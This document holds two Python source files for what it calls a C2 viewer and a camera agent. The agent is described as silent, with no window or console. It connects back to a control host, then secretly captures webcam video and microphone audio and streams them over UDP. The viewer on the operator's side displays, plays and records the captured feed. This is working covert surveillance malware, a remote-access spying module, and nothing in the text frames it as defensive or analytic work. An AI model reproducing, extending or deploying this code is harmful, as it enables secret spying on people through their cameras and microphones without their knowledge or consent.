"""
camera_c2.py  ──  C2 / Viewer side
====================================
Usage:
    viewer = CameraViewer(host="192.168.1.5", udp_port=55200)
    viewer.start()

Features:
  - Live MJPEG camera stream over UDP
  - FPS slider
  - Quality slider
  - Microphone checkbox  →  plays live audio + records it
  - Camera index combobox  →  switching camera restarts agent stream seamlessly
  - Record / Stop button
  - Save Record button  →  saves .avi + _audio.wav
  - Closing window without saving discards the buffer

Protocol  (ctrl TCP, C2→agent):
  CAMCONF:<fps>:<quality>:<mic>:<cam_index>\n
  CAMSTOP\n
  CAMENUMCAMS\n               →  agent replies with  CAMS:<n>\n
"""

import tkinter as tk
from tkinter import ttk, filedialog
import socket
import struct
import threading
import io
import os
import time
import datetime

from PIL import Image, ImageTk

try:
    import cv2
    import numpy as np
    HAS_CV2 = True
except ImportError:
    HAS_CV2 = False

try:
    import soundfile as sf
    HAS_SF = True
except ImportError:
    HAS_SF = False

try:
    import pyaudio
    HAS_PA = True
except ImportError:
    HAS_PA = False

if not HAS_CV2:
    import numpy as np   # still need numpy for audio even without cv2

UDP_MAX          = 60000
HEADER_FMT       = "!IHHH"
HEADER_SIZE      = struct.calcsize(HEADER_FMT)
AUDIO_MARKER     = b"\xAA\xBB\xCC\xDD"
CTRL_PORT_OFFSET = 1
AUDIO_SAMPLERATE = 44100
AUDIO_CHANNELS   = 1
AUDIO_CHUNK      = 1024


class CameraViewer:
    def __init__(self, host: str, udp_port: int):
        self.host      = host
        self.udp_port  = udp_port
        self.ctrl_port = udp_port + CTRL_PORT_OFFSET

        self._running     = False
        self._ctrl_sock   = None
        self._ctrl_ready  = False
        self._send_after  = None

        self._frame      = None
        self._photo      = None
        self._rx_fps     = 0

        # recording
        self._recording    = False
        self._video_frames = []
        self._audio_chunks = []
        self._record_start = None

        # audio playback
        self._pa_instance  = None
        self._pa_stream    = None
        self._audio_lock   = threading.Lock()

        self._win    = None
        self._canvas = None

    # ── public ────────────────────────────────────────────────────────────────

    def start(self):
        """Open viewer window. Must be called from the tkinter main thread."""
        self._running = True
        self._build_ui()
        self._init_audio_playback()
        threading.Thread(target=self._udp_receiver,  daemon=True).start()
        threading.Thread(target=self._ctrl_listener, daemon=True).start()
        self._win.after(100, self._update_canvas)

    def stop(self):
        self._running    = False
        self._ctrl_ready = False
        self._recording  = False
        self._close_audio_playback()
        if self._ctrl_sock:
            try:
                self._ctrl_sock.sendall(b"CAMSTOP\n")
                self._ctrl_sock.close()
            except Exception:
                pass
        if self._win:
            try:
                self._win.destroy()
            except Exception:
                pass

    # ── audio playback init/close ─────────────────────────────────────────────

    def _init_audio_playback(self):
        if not HAS_PA:
            return
        try:
            self._pa_instance = pyaudio.PyAudio()
            self._pa_stream   = self._pa_instance.open(
                format=pyaudio.paInt16,
                channels=AUDIO_CHANNELS,
                rate=AUDIO_SAMPLERATE,
                output=True,
                frames_per_buffer=AUDIO_CHUNK,
            )
        except Exception as e:
            print(f"[CAM] audio playback init failed: {e}")

    def _close_audio_playback(self):
        with self._audio_lock:
            try:
                if self._pa_stream:
                    self._pa_stream.stop_stream()
                    self._pa_stream.close()
                if self._pa_instance:
                    self._pa_instance.terminate()
            except Exception:
                pass
            self._pa_stream   = None
            self._pa_instance = None

    def _play_audio(self, pcm_bytes: bytes):
        """Play a chunk of raw PCM16 audio. Called from the UDP thread."""
        with self._audio_lock:
            if self._pa_stream:
                try:
                    self._pa_stream.write(pcm_bytes, exception_on_underflow=False)
                except Exception:
                    pass

    # ── UI ────────────────────────────────────────────────────────────────────

    def _build_ui(self):
        self._win = tk.Toplevel()
        self._win.title(f"Camera View — {self.host}:{self.udp_port}")
        self._win.configure(bg="#1a1a1a")
        self._win.resizable(True, True)
        self._win.protocol("WM_DELETE_WINDOW", self._on_close)

        self._canvas = tk.Canvas(self._win, bg="black",
                                 highlightthickness=0, width=640, height=480)
        self._canvas.pack(fill="both", expand=True)

        # ── row 1: sliders ────────────────────────────────────────────────────
        row1 = ttk.Frame(self._win)
        row1.pack(fill="x", padx=8, pady=(4, 0))

        # FPS
        ttk.Label(row1, text="FPS:").pack(side="left")
        self._fps_var = tk.IntVar(value=15)
        ttk.Scale(row1, from_=1, to=30, orient="horizontal", length=110,
                  variable=self._fps_var,
                  command=self._on_slider_change).pack(side="left", padx=(2, 2))
        self._fps_label = ttk.Label(row1, text="15", width=3)
        self._fps_label.pack(side="left", padx=(0, 14))

        # Quality
        ttk.Label(row1, text="Quality:").pack(side="left")
        self._quality_var = tk.IntVar(value=60)
        ttk.Scale(row1, from_=1, to=95, orient="horizontal", length=110,
                  variable=self._quality_var,
                  command=self._on_slider_change).pack(side="left", padx=(2, 2))
        self._quality_label = ttk.Label(row1, text="60%", width=4)
        self._quality_label.pack(side="left", padx=(0, 14))

        # ── row 2: controls ───────────────────────────────────────────────────
        row2 = ttk.Frame(self._win)
        row2.pack(fill="x", padx=8, pady=(2, 4))

        # Camera combobox
        ttk.Label(row2, text="Camera:").pack(side="left")
        self._cam_var = tk.IntVar(value=0)
        self._cam_combo = ttk.Combobox(row2, textvariable=self._cam_var,
                                       values=["0"], width=6, state="readonly")
        self._cam_combo.pack(side="left", padx=(2, 4))
        self._cam_combo.bind("<<ComboboxSelected>>", self._on_cam_change)

        ttk.Button(row2, text="🔍 Scan", width=6,
                   command=self._request_cam_enum).pack(side="left", padx=(0, 14))

        # Mic checkbox
        self._mic_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(row2, text="🎤 Mic",
                        variable=self._mic_var,
                        command=self._on_mic_toggle).pack(side="left", padx=(0, 14))

        # Record / Save
        self._rec_btn  = ttk.Button(row2, text="⏺ Record", command=self._toggle_record)
        self._rec_btn.pack(side="left", padx=(0, 4))
        self._save_btn = ttk.Button(row2, text="💾 Save Record",
                                    command=self._save_record, state="disabled")
        self._save_btn.pack(side="left", padx=(0, 8))

        self._rec_label    = ttk.Label(row2, text="")
        self._rec_label.pack(side="left")

        self._status_label = ttk.Label(row2, text="Waiting for agent...")
        self._status_label.pack(side="right")

    # ── slider / checkbox / combobox callbacks ────────────────────────────────

    def _on_slider_change(self, *_):
        """Debounce 150 ms then send."""
        if self._send_after is not None:
            self._win.after_cancel(self._send_after)
        self._send_after = self._win.after(150, self._send_config)

    def _on_mic_toggle(self):
        self._send_config()

    def _on_cam_change(self, *_):
        """User picked a different camera — extract numeric index and tell agent."""
        selected = self._cam_combo.get()         # e.g. "1: Integrated Webcam"
        try:
            self._cam_var.set(int(selected.split(":")[0]))
        except Exception:
            self._cam_var.set(self._cam_combo.current())
        self._send_config()

    def _send_config(self):
        """Push current slider/checkbox/combobox state to agent."""
        self._send_after = None
        f   = int(self._fps_var.get())
        q   = int(self._quality_var.get())
        mic = 1 if self._mic_var.get() else 0
        cam = int(self._cam_var.get())

        self._fps_label.configure(text=str(f))
        self._quality_label.configure(text=f"{q}%")

        if self._ctrl_sock and self._ctrl_ready:
            try:
                self._ctrl_sock.sendall(f"CAMCONF:{f}:{q}:{mic}:{cam}\n".encode())
            except Exception as e:
                print(f"[CAM] ctrl send error: {e}")
                self._ctrl_ready = False

    def _request_cam_enum(self):
        """Ask agent to report how many cameras it has."""
        if self._ctrl_sock and self._ctrl_ready:
            try:
                self._ctrl_sock.sendall(b"CAMENUMCAMS\n")
            except Exception:
                pass

    def _update_cam_list(self, names: list):
        """Called on main thread when agent reports camera list."""
        self._cam_combo.configure(values=names)
        if names:
            self._cam_combo.current(0)
            self._cam_var.set(0)   # index 0 = first camera

    # ── record controls ───────────────────────────────────────────────────────

    def _toggle_record(self):
        if not self._recording:
            self._video_frames = []
            self._audio_chunks = []
            self._record_start = time.monotonic()
            self._recording    = True
            self._rec_btn.configure(text="⏹ Stop")
            self._save_btn.configure(state="disabled")
        else:
            self._recording = False
            self._rec_btn.configure(text="⏺ Record")
            n = len(self._video_frames)
            self._rec_label.configure(text=f"Stopped ({n} frames)")
            if n > 0:
                self._save_btn.configure(state="normal")

    def _save_record(self):
        if not self._video_frames:
            return
        path = filedialog.asksaveasfilename(
            defaultextension=".avi",
            filetypes=[("AVI video", "*.avi"), ("All files", "*.*")],
            initialfile=f"cam_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.avi"
        )
        if not path:
            return

        fps = int(self._fps_var.get())

        if not HAS_CV2:
            # fallback GIF
            gif = os.path.splitext(path)[0] + ".gif"
            self._video_frames[0].save(
                gif, save_all=True,
                append_images=self._video_frames[1:],
                duration=max(1, int(1000 / fps)), loop=0
            )
            self._rec_label.configure(text=f"Saved GIF: {os.path.basename(gif)}")
        else:
            w, h   = self._video_frames[0].size
            fourcc = cv2.VideoWriter_fourcc(*"MJPG")
            writer = cv2.VideoWriter(path, fourcc, fps, (w, h))
            for img in self._video_frames:
                writer.write(cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR))
            writer.release()
            self._rec_label.configure(text=f"Saved: {os.path.basename(path)}")

        # save audio
        if self._audio_chunks and HAS_SF:
            raw      = b"".join(self._audio_chunks)
            audio_np = np.frombuffer(raw, dtype=np.int16).astype(np.float32) / 32768.0
            sf.write(os.path.splitext(path)[0] + "_audio.wav",
                     audio_np, AUDIO_SAMPLERATE)

        self._save_btn.configure(state="disabled")
        self._video_frames = []
        self._audio_chunks = []

    # ── UDP receiver thread ───────────────────────────────────────────────────

    def _udp_receiver(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4 * 1024 * 1024)
        sock.bind(("0.0.0.0", self.udp_port))
        sock.settimeout(1.0)

        buffer        = {}
        last_complete = -1
        frame_times   = []

        while self._running:
            try:
                packet, _ = sock.recvfrom(UDP_MAX + HEADER_SIZE + 64)
            except socket.timeout:
                continue
            except Exception as e:
                print(f"[CAM] udp recv error: {e}")
                break

            if len(packet) < 4:
                continue

            # audio packet
            if packet[:4] == AUDIO_MARKER:
                pcm = packet[4:]
                self._play_audio(pcm)           # play live
                if self._recording:
                    self._audio_chunks.append(pcm)   # also record
                continue

            # video packet
            if len(packet) < HEADER_SIZE:
                continue

            frame_id, chunk_idx, total_chunks, chunk_len = struct.unpack_from(
                HEADER_FMT, packet, 0
            )
            payload = packet[HEADER_SIZE: HEADER_SIZE + chunk_len]

            if frame_id < last_complete:
                continue

            if frame_id not in buffer:
                buffer = {k: v for k, v in buffer.items() if k >= frame_id - 5}
                buffer[frame_id] = {}

            buffer[frame_id][chunk_idx] = payload

            if len(buffer[frame_id]) == total_chunks:
                chunks     = buffer.pop(frame_id)
                jpeg_bytes = b"".join(chunks[i] for i in range(total_chunks))
                try:
                    img = Image.open(io.BytesIO(jpeg_bytes))
                    img.load()
                    self._frame = img
                    last_complete = frame_id
                    if self._recording:
                        self._video_frames.append(img.copy())
                    now = time.monotonic()
                    frame_times.append(now)
                    frame_times  = [t for t in frame_times if now - t <= 1.0]
                    self._rx_fps = len(frame_times)
                except Exception:
                    pass

        sock.close()

    # ── TCP ctrl listener ─────────────────────────────────────────────────────

    def _ctrl_listener(self):
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", self.ctrl_port))
        srv.listen(1)
        srv.settimeout(2.0)
        print(f"[CAM] ctrl on :{self.ctrl_port}")

        while self._running:
            try:
                conn, addr = srv.accept()
                self._ctrl_sock  = conn
                self._ctrl_ready = True
                print(f"[CAM] agent from {addr}")
                # push initial config + request camera list
                self._win.after(0, self._send_config)
                self._win.after(100, self._request_cam_enum)

                # read any replies from agent (e.g. CAMS:<n>)
                conn.settimeout(2.0)
                buf = ""
                while self._running:
                    try:
                        chunk = conn.recv(256).decode("utf-8", errors="ignore")
                        if not chunk:
                            break
                        buf += chunk
                        while "\n" in buf:
                            line, buf = buf.split("\n", 1)
                            line = line.strip()
                            if line.startswith("CAMS:"):
                                try:
                                    # format: CAMS:<n>|name0|name1|...
                                    rest  = line[5:]           # strip "CAMS:"
                                    parts = rest.split("|")
                                    n     = int(parts[0])
                                    names = parts[1:] if len(parts) > 1 else [str(i) for i in range(n)]
                                    self._win.after(0, lambda names=names: self._update_cam_list(names))
                                except Exception:
                                    pass
                    except socket.timeout:
                        continue
                    except Exception:
                        break
                break
            except socket.timeout:
                continue
            except Exception as e:
                print(f"[CAM] ctrl error: {e}")
                break
        srv.close()

    # ── canvas refresh ────────────────────────────────────────────────────────

    def _update_canvas(self):
        if not self._running:
            return
        if self._frame is not None:
            cw = self._canvas.winfo_width()
            ch = self._canvas.winfo_height()
            img   = self._frame.resize((cw, ch), Image.LANCZOS) if cw > 1 and ch > 1 else self._frame
            photo = ImageTk.PhotoImage(img)
            self._photo = photo
            self._canvas.delete("all")
            self._canvas.create_image(0, 0, anchor="nw", image=photo)
            w, h = self._frame.size
            dot  = "● " if self._ctrl_ready else "○ "
            self._status_label.configure(
                text=f"{dot}{w}×{h}  |  {self._rx_fps} fps rx"
            )

        if self._recording:
            elapsed    = int(time.monotonic() - (self._record_start or 0))
            mins, secs = divmod(elapsed, 60)
            self._rec_label.configure(text=f"🔴 {mins:02d}:{secs:02d}")

        self._win.after(33, self._update_canvas)

    # ── close ─────────────────────────────────────────────────────────────────

    def _on_close(self):
        self._video_frames = []
        self._audio_chunks = []
        self.stop()

"""
camera_agent.py  ──  Agent / Client side
=========================================
Usage:
    agent = CameraAgent(server_ip="192.168.1.5", udp_port=55200)
    agent.start()
    agent.stop()

Silent. No window. No console.
Supports:
  - Quality slider
  - FPS slider
  - Mic on/off with live audio streaming
  - Camera index switch (seamless — no restart needed)
  - Camera enumeration on request

Protocol (ctrl TCP, agent→C2):
  CAMS:<n>\n    — reply to CAMENUMCAMS

Protocol (ctrl TCP, C2→agent):
  CAMCONF:<fps>:<quality>:<mic>:<cam_index>\n
  CAMSTOP\n
  CAMENUMCAMS\n
"""

import socket
import struct
import threading
import io
import time

import cv2
import numpy as np

UDP_MAX          = 60000
HEADER_FMT       = "!IHHH"
HEADER_SIZE      = struct.calcsize(HEADER_FMT)
AUDIO_MARKER     = b"\xAA\xBB\xCC\xDD"
CTRL_PORT_OFFSET = 1
AUDIO_SAMPLERATE = 44100
AUDIO_CHANNELS   = 1
AUDIO_CHUNK      = 1024


class CameraAgent:
    def __init__(self, server_ip: str, udp_port: int, camera_index: int = 0):
        self.server_ip    = server_ip
        self.udp_port     = udp_port
        self.ctrl_port    = udp_port + CTRL_PORT_OFFSET

        self._running      = False
        self._fps          = 15
        self._quality      = 60
        self._mic_on       = False
        self._cam_index    = camera_index
        self._lock         = threading.Lock()

        # stream restart flag: when cam index changes we set this
        # the stream loop detects it, reopens camera and clears the flag
        self._cam_changed  = False
        self._cap          = None

    # ── public ────────────────────────────────────────────────────────────────

    def start(self):
        with self._lock:
            if self._running:
                return
            self._running = True

        threading.Thread(target=self._stream_loop,   daemon=True, name="cam-stream").start()
        threading.Thread(target=self._ctrl_listener, daemon=True, name="cam-ctrl").start()

    def stop(self):
        with self._lock:
            self._running = False

    # ── camera helpers ────────────────────────────────────────────────────────

    def _open_camera(self, index: int):
        """Try CAP_DSHOW first, fall back to CAP_MSMF."""
        for backend in (cv2.CAP_DSHOW, cv2.CAP_MSMF):
            try:
                cap = cv2.VideoCapture(index, backend)
                if cap.isOpened():
                    cap.set(cv2.CAP_PROP_FRAME_WIDTH,  10000)
                    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 10000)
                    return cap
                cap.release()
            except Exception:
                continue
        # last resort — default backend
        return cv2.VideoCapture(index)

    @staticmethod
    def _count_cameras() -> int:
        """
        Use cv2_enumerate_cameras to list cameras.
        Returns the number found, minimum 1.
        """
        try:
            from cv2_enumerate_cameras import enumerate_cameras
            # try DSHOW first, fall back to MSMF
            for backend in (cv2.CAP_DSHOW, cv2.CAP_MSMF):
                try:
                    cams = enumerate_cameras(backend)
                    if cams:
                        return len(cams)
                except Exception:
                    continue
        except ImportError:
            pass
        return 1

    @staticmethod
    def _get_camera_names() -> list:
        """
        Returns a list of camera name strings using cv2_enumerate_cameras.
        Falls back to ["Camera 0"] if the module is unavailable.
        DSHOW preferred, MSMF as fallback.
        """
        try:
            from cv2_enumerate_cameras import enumerate_cameras
            for backend in (cv2.CAP_DSHOW, cv2.CAP_MSMF):
                try:
                    cams = enumerate_cameras(backend)
                    if cams:
                        return [f"{c.index}: {c.name}" for c in cams]
                except Exception:
                    continue
        except ImportError:
            pass
        return ["0: Camera 0"]

    # ── capture ───────────────────────────────────────────────────────────────

    def _capture_jpeg(self, quality: int) -> bytes:
        if self._cap is None or not self._cap.isOpened():
            return b""
        ok, frame = self._cap.read()
        if not ok or frame is None:
            return b""
        ok, enc = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, quality])
        return enc.tobytes() if ok else b""

    # ── UDP helpers ───────────────────────────────────────────────────────────

    def _send_frame(self, sock: socket.socket, dest: tuple, frame_id: int, jpeg: bytes):
        chunks = [jpeg[i: i + UDP_MAX] for i in range(0, len(jpeg), UDP_MAX)]
        for idx, chunk in enumerate(chunks):
            hdr = struct.pack(HEADER_FMT, frame_id, idx, len(chunks), len(chunk))
            try:
                sock.sendto(hdr + chunk, dest)
            except Exception:
                pass

    def _send_audio(self, sock: socket.socket, dest: tuple, pcm: bytes):
        try:
            sock.sendto(AUDIO_MARKER + pcm, dest)
        except Exception:
            pass

    # ── stream loop ───────────────────────────────────────────────────────────

    def _stream_loop(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
        dest     = (self.server_ip, self.udp_port)
        frame_id = 0

        with self._lock:
            current_index = self._cam_index

        self._cap = self._open_camera(current_index)

        while True:
            with self._lock:
                if not self._running:
                    break
                fps         = self._fps
                quality     = self._quality
                cam_changed = self._cam_changed
                new_index   = self._cam_index

            # seamless camera switch — release old, open new, no thread restart
            if cam_changed:
                if self._cap:
                    self._cap.release()
                self._cap = self._open_camera(new_index)
                current_index = new_index
                with self._lock:
                    self._cam_changed = False

            t = time.monotonic()
            try:
                jpeg = self._capture_jpeg(quality)
                if jpeg:
                    self._send_frame(sock, dest, frame_id & 0xFFFFFFFF, jpeg)
                    frame_id += 1
            except Exception:
                pass

            time.sleep(max(0.0, (1.0 / fps) - (time.monotonic() - t)))

        if self._cap:
            self._cap.release()
        sock.close()

    # ── mic loop ──────────────────────────────────────────────────────────────

    def _mic_loop(self, sock: socket.socket, dest: tuple):
        try:
            import pyaudio
            pa     = pyaudio.PyAudio()
            stream = pa.open(
                format=pyaudio.paInt16,
                channels=AUDIO_CHANNELS,
                rate=AUDIO_SAMPLERATE,
                input=True,
                frames_per_buffer=AUDIO_CHUNK,
            )
            while True:
                with self._lock:
                    if not self._running or not self._mic_on:
                        break
                try:
                    data = stream.read(AUDIO_CHUNK, exception_on_overflow=False)
                    self._send_audio(sock, dest, data)
                except Exception:
                    break
            stream.stop_stream()
            stream.close()
            pa.terminate()
        except Exception:
            pass

    # ── ctrl listener ─────────────────────────────────────────────────────────

    def _ctrl_listener(self):
        mic_thread = None
        mic_sock   = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        mic_sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1 * 1024 * 1024)
        dest = (self.server_ip, self.udp_port)

        while True:
            with self._lock:
                if not self._running:
                    mic_sock.close()
                    return
            try:
                conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                conn.settimeout(3.0)
                conn.connect((self.server_ip, self.ctrl_port))
                conn.settimeout(2.0)
                buf = ""

                while True:
                    with self._lock:
                        if not self._running:
                            conn.close()
                            mic_sock.close()
                            return
                    try:
                        data = conn.recv(256).decode("utf-8", errors="ignore")
                        if not data:
                            break
                        buf += data
                        while "\n" in buf:
                            line, buf = buf.split("\n", 1)
                            line = line.strip()

                            # ── CAMCONF:<fps>:<quality>:<mic>:<cam> ──────────
                            if line.startswith("CAMCONF:"):
                                try:
                                    parts = line.split(":")
                                    f, q, m, c = int(parts[1]), int(parts[2]), \
                                                 int(parts[3]), int(parts[4])
                                    with self._lock:
                                        self._fps     = max(1, min(30, f))
                                        self._quality = max(1, min(95, q))
                                        new_mic       = bool(m)
                                        mic_changed   = new_mic != self._mic_on
                                        self._mic_on  = new_mic
                                        # trigger cam switch if index changed
                                        if c != self._cam_index:
                                            self._cam_index   = c
                                            self._cam_changed = True

                                    if mic_changed:
                                        if new_mic:
                                            mic_thread = threading.Thread(
                                                target=self._mic_loop,
                                                args=(mic_sock, dest),
                                                daemon=True, name="cam-mic"
                                            )
                                            mic_thread.start()
                                        # stopping: loop exits when _mic_on=False
                                except Exception:
                                    pass

                            # ── CAMENUMCAMS ──────────────────────────────────
                            elif line == "CAMENUMCAMS":
                                names = CameraAgent._get_camera_names()
                                try:
                                    # send "CAMS:<n>|name0|name1|...\n"
                                    payload = f"CAMS:{len(names)}|" + "|".join(names)
                                    conn.sendall((payload + "\n").encode())
                                except Exception:
                                    pass

                            # ── CAMSTOP ──────────────────────────────────────
                            elif line == "CAMSTOP":
                                self.stop()
                                conn.close()
                                mic_sock.close()
                                return

                    except socket.timeout:
                        continue
                    except Exception:
                        break

                conn.close()
            except Exception:
                pass
            time.sleep(2)